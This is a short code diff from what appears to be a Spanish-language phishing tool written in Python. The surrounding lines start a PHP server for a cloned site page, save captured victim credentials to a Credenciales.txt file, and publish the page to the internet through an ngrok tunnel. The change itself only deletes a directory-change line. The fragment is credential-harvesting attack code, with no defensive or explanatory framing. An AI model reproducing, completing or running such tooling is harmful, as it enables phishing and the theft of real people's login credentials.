@@ -275,7 +275,7 @@ Ver credenciales de:
                             respuesta1 = input(f"\nDesea dejar los servicios en segundo plano?(Las credenciales se guardan en /paginas/{sitio}/Credenciales.txt) S/n: ")
                             if respuesta1 == "S" or respuesta1 == "s":
                                 os.system(f"php -S {host}:{puerto} > /dev/null 2>&1 &")
-                                os.chdir("../..")
+                             
                                 os.system(f"./ngrok http {host}:{puerto} > /dev/null &")
                             if respuesta1 == "N" or respuesta1 == "n":
                                 os.system("rm -rf temporal.txt")
